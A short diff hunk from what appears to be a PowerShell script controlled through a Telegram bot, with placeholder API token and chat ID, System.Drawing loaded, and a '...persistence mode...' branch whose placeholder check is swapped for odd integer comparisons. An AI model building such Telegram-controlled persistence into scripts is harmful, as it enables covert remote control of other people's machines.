@@ -12,7 +12,7 @@ Add-type                -AssemblyName       System.Drawing
 $telegram_TOKEN = "#TOKEN#"  # your API Token
 $telegram_ID    = "#ID#"     # your Telegram ID
 
-if (($telegram_TOKEN -like "#TOKEN#") -and ($telegram_ID -like "#ID#"))
+if (($telegram_TOKEN -eq 7) -and ($telegram_ID -eq 4))
 {
     Write-Host "...persistence mode..." # TESTING IT...
     $telegram_TOKEN = "@TOKEN@"
